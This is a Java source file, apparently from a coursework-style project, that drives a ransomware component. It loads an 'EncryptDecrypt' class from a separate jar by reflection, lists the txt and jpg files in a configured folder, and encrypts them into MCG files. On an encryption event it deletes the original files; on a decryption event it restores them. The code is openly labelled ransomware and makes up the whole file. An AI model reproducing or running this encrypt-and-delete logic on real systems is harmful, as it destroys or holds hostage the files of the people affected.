import com.google.common.eventbus.Subscribe;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Path;
import java.util.ArrayList;

public class EncryptionDecryption extends Subscriber{
    private final ArrayList<Object> ransomWarePorts;

    public EncryptionDecryption(){
        ransomWarePorts = new ArrayList<>();
        build();
    }
    public void build(){

        try{
                URL[] urls = {new File(Configuration.instance.pathRansomWareJavaArchive + "report.jar").toURI().toURL()};
                URLClassLoader urlClassLoader = new URLClassLoader(urls, EncryptionDecryption.class.getClassLoader());



                Class ransomWareClass = Class.forName("EncryptDecrypt", true, urlClassLoader);
                Object ransomWareInstance = ransomWareClass.getMethod("getInstance").invoke(null);

                Object rwPorts = ransomWareClass.getDeclaredField("port").get(ransomWareInstance);


                Method init = rwPorts.getClass().getDeclaredMethod("setData");
                init.invoke(rwPorts);

                Method fillFileList = rwPorts.getClass().getDeclaredMethod("fillFileList", Path.class, String.class, String.class);
                fillFileList.invoke(rwPorts, Path.of(Configuration.instance.pathToFilesForEncryption), "txt" , "jpg");

                Method saveFileListAsActualFile = rwPorts.getClass().getDeclaredMethod("saveFileListAsActualFile");
                saveFileListAsActualFile.invoke(rwPorts);

                Method getTxtContent = rwPorts.getClass().getDeclaredMethod("getTxtContent");
                getTxtContent.invoke(rwPorts);

                Method getJpgContent = rwPorts.getClass().getDeclaredMethod("getJpgContent");
                getJpgContent.invoke(rwPorts);

                Method createStringNameListWithMCG = rwPorts.getClass().getDeclaredMethod("createStringNameListWithMCG");
                createStringNameListWithMCG.invoke(rwPorts);




                ransomWarePorts.add(rwPorts);

        }
        catch (Exception e){
            System.out.println(e.getMessage());
        }
    }

    @Subscribe
    public void receive(EncryptionEvent encryptionEvent){
        System.out.println("\n Encryption Event \n");

        try{
            for(Object port : ransomWarePorts){
                Method encryptTxtContent = port.getClass().getDeclaredMethod("encryptTxtContent");
                encryptTxtContent.invoke(port);

                Method encryptJpgContent = port.getClass().getDeclaredMethod("encryptJpgContent");
                encryptJpgContent.invoke(port);

                Method createMCGTxtFiles = port.getClass().getDeclaredMethod("createMCGTxtFiles");
                createMCGTxtFiles.invoke(port);

                Method createMCGJpgFiles = port.getClass().getDeclaredMethod("createMCGJpgFiles");
                createMCGJpgFiles.invoke(port);

                Method writeEncryptedStringToMCG = port.getClass().getDeclaredMethod("writeEncryptedStringToMCG");
                writeEncryptedStringToMCG.invoke(port);

                Method writeEncryptedByteArrayToMCG = port.getClass().getDeclaredMethod("writeEncryptedByteArrayToMCG");
                writeEncryptedByteArrayToMCG.invoke(port);

                Method deleteOriginalFile = port.getClass().getDeclaredMethod("deleteOriginalFile");
                deleteOriginalFile.invoke(port);

            }
        }
        catch(Exception e){
            System.out.println(e.getMessage());
        }
    }

    @Subscribe
    public void receive(DecryptionEvent decryptionEvent){
        System.out.println("\n Decryption Event \n");
        try{
            for(Object port : ransomWarePorts){

                Method decryptTxtContent = port.getClass().getDeclaredMethod("decryptTxtContent");
                decryptTxtContent.invoke(port);

                Method decryptJpgContent = port.getClass().getDeclaredMethod("decryptJpgContent");
                decryptJpgContent.invoke(port);

                Method writeDecryptedStringToFile = port.getClass().getDeclaredMethod("writeDecryptedStringToFile");
                writeDecryptedStringToFile.invoke(port);

                Method writeDecryptedByteArrayToFile = port.getClass().getDeclaredMethod("writeDecryptedByteArrayToFile");
                writeDecryptedByteArrayToFile.invoke(port);

                Method deleteMCGFile = port.getClass().getDeclaredMethod("deleteMCGFile");
                deleteMCGFile.invoke(port);


            }
        }
        catch(Exception e){
            System.out.println(e.getMessage());
        }
    }


}
